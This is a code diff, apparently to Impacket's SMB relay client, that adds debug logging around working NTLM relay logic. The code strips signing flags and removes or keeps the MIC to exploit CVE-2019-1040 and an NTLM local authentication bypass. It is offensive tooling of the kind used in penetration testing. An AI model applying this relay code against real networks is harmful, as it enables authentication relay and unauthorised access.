@@ -312,10 +312,16 @@ class SMBRelayClient(ProtocolClient):
         self._uid = uid
 
     def sendNegotiate(self, negotiateMessage):
+        LOG.debug('[SMB] sendNegotiate: Starting NTLM negotiation')
         negoMessage = NTLMAuthNegotiate()
         negoMessage.fromString(negotiateMessage)
+
+        original_flags = negoMessage['flags']
+        LOG.debug('[SMB] sendNegotiate: Original NTLM flags: 0x%x' % original_flags)
+
         # When exploiting CVE-2019-1040 or NTLM local auth bypass, remove signing flags
         if self.serverConfig.remove_mic:
+            LOG.debug('[SMB] sendNegotiate: Using --remove-mic mode (CVE-2019-1040)')
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
@@ -325,18 +331,22 @@ class SMBRelayClient(ProtocolClient):
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
         elif self.serverConfig.remove_mic_partial:
+            LOG.debug('[SMB] sendNegotiate: Using --remove-mic-partial mode (NTLM local auth bypass)')
             # Only remove signing flags, keep KEY_EXCH and VERSION
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
 
+        LOG.debug('[SMB] sendNegotiate: Modified NTLM flags: 0x%x' % negoMessage['flags'])
         negotiateMessage = negoMessage.getData()
 
         challenge = NTLMAuthChallenge()
         if self.session.getDialect() == SMB_DIALECT:
+            LOG.debug('[SMB] sendNegotiate: Using SMBv1 dialect')
             challenge.fromString(self.sendNegotiatev1(negotiateMessage))
         else:
+            LOG.debug('[SMB] sendNegotiate: Using SMBv2/v3 dialect')
             challenge.fromString(self.sendNegotiatev2(negotiateMessage))
 
         self.negotiateMessage = negotiateMessage
@@ -346,6 +356,7 @@ class SMBRelayClient(ProtocolClient):
         self.sessionData['CHALLENGE_MESSAGE'] = challenge
         self.serverChallenge = challenge['challenge']
 
+        LOG.debug('[SMB] sendNegotiate: Received challenge from server, returning to relay')
         return challenge
 
     def sendNegotiatev2(self, negotiateMessage):
@@ -483,9 +494,11 @@ class SMBRelayClient(ProtocolClient):
         return clientResponse, errorCode
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+        LOG.debug('[SMB] sendAuth: Starting authentication with server')
 
         # When exploiting CVE-2019-1040, remove flags and zero out MIC/Version
         if self.serverConfig.remove_mic:
+            LOG.debug('[SMB] sendAuth: Applying --remove-mic transformations')
             authMessage = NTLMAuthChallengeResponse()
             authMessage.fromString(authenticateMessageBlob)
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
@@ -503,14 +516,21 @@ class SMBRelayClient(ProtocolClient):
             authenticateMessageBlob = authMessage.getData()
         # When exploiting NTLM local authentication bypass, remove SIGN/SEAL but keep MIC/Version intact
         elif self.serverConfig.remove_mic_partial:
+            LOG.debug('[SMB] sendAuth: Applying --remove-mic-partial transformations')
             authMessage = NTLMAuthChallengeResponse()
             authMessage.fromString(authenticateMessageBlob)
+
+            original_flags = authMessage['flags']
+            LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)
+
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
             if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                 authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
             # Do NOT remove KEY_EXCH or VERSION flags
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
+
+            LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, MIC intact' % authMessage['flags'])
             authenticateMessageBlob = authMessage.getData()
 
         #if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
@@ -542,9 +562,13 @@ class SMBRelayClient(ProtocolClient):
             #authData = respToken2.getData()
 
         if self.session.getDialect() == SMB_DIALECT:
+            LOG.debug('[SMB] sendAuth: Sending SMBv1 authentication')
             token, errorCode = self.sendAuthv1(authData, serverChallenge)
         else:
+            LOG.debug('[SMB] sendAuth: Sending SMBv2/v3 authentication')
             token, errorCode = self.sendAuthv2(authData, serverChallenge)
+
+        LOG.debug('[SMB] sendAuth: Authentication completed with error code: 0x%x' % errorCode)
 
         if signingKey:
             logging.info("Enabling session signing")
